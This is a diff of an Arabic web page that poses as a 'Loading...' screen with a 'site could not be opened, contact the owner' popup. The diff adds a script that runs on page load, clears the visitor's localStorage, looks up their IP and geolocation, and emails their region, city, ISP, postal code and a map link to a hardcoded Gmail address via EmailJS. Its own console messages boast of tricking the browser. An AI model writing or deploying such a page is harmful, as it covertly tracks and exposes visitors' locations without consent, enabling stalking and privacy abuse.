@@ -2,10 +2,9 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>جارٍ التحميل...</title>
     <style>
-        /* استدعاء خطوط النظام (macOS, Windows, Android) */
         body {
             margin: 0;
             height: 100vh;
@@ -22,7 +21,6 @@
             user-select: none;
         }
 
-        /* خلفية قاتمة شفافة للنافذة */
         #popup {
             position: fixed;
             top: 0; right: 0; bottom: 0; left: 0;
@@ -36,13 +34,11 @@
             transition: opacity 0.4s ease;
         }
 
-        /* تفعيل ظهور النافذة */
         #popup.active {
             opacity: 1;
             pointer-events: all;
         }
 
-        /* صندوق النافذة */
         #popup > div {
             background: #121418;
             padding: 40px 35px;
@@ -62,16 +58,14 @@
             user-select: text;
         }
 
-        /* عناوين النص داخل النافذة */
         #popup p {
             margin: 0.4em 0;
             font-weight: 600;
             line-height: 1.4;
-            color: #f44336; /* لون أحمر مميز */
+            color: #f44336;
             text-shadow: 0 0 8px #f44336aa;
         }
 
-        /* الايميل بخط ثابت ولون مغاير */
         #popup p.email {
             color: #82aaff;
             font-weight: 700;
@@ -84,7 +78,6 @@
             text-shadow: 0 0 6px #82aaffcc;
         }
 
-        /* حركة ظهور النافذة */
         @keyframes popupIn {
             0% {
                 opacity: 0;
@@ -96,7 +89,6 @@
             }
         }
 
-        /* استجابة للجوال */
         @media (max-width: 480px) {
             #popup > div {
                 padding: 30px 20px;
@@ -116,22 +108,69 @@
     <div>
         <p>تعذر فتح الموقع</p>
         <p>يرجى التواصل مع عناد الحربي لحل المشكلة</p>
-        <p class="email" tabindex="0">SNAPCHAT | qdp_u</p>
+        <p class="email" tabindex="0">e508769103@gmail.com</p>
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script src="script.js"></script>
-
 <script>
-    // مثال بسيط لإظهار النافذة بفخامة عند الحاجة (تستدعى من سكربتك)
-    function showPopup() {
-        const popup = document.getElementById("popup");
-        popup.classList.add("active");
-    }
+console.log("تم خداع المتصفح بنجاح");
 
-    // هنا فقط للتجربة، يمكنك حذفها أو تعديلها حسب سكربتك
-    // setTimeout(showPopup, 2000);
+window.onload = function () {
+    console.log("يتم الان جلب بيانات الشخص");
+    localStorage.clear();
+
+    const popup = document.getElementById("popup");
+    emailjs.init("GRpOF1pKqcSg9cx5H");
+
+    fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+            console.log("IP:", data.ip);
+            return fetch(`https://ipapi.co/${data.ip}/json/`);
+        })
+        .then(res => res.json())
+        .then(loc => {
+            console.log("Location data from ipapi:", loc);
+
+            let googleMapUrl = "تعذر توليد رابط الخريطة";
+
+            if (loc.latitude && loc.longitude) {
+                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
+            }
+
+            const locationString = `
+                المنطقة: ${loc.region || 'غير معروف'}
+                المدينة: ${loc.city || 'غير معروف'}
+                المحافظة: ${loc.county || 'غير معروف'}
+                المزود: ${loc.org || 'غير معروف'}
+                الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
+                رابط الخريطة: ${googleMapUrl}
+            `;
+
+            console.log("Location string to send:", locationString);
+
+            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
+                to_email: "e508769103@gmail.com",
+                name: "تم جلب موقع شخص الان",
+                time: new Date().toLocaleString('ar-EG'),
+                message: locationString
+            });
+        })
+        .then((response) => {
+            console.log("Email sent successfully:", response.status, response.text);
+        })
+        .catch(err => {
+            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
+        })
+        .finally(() => {
+            if (popup) {
+                popup.classList.add("active");  // إضافة الكلاس لظهور النافذة مع الأنيميشن
+            }
+        });
+};
+
+console.log("تم اتمام العملية بنجاح , EnnnadTools");
 </script>
 
 </body>
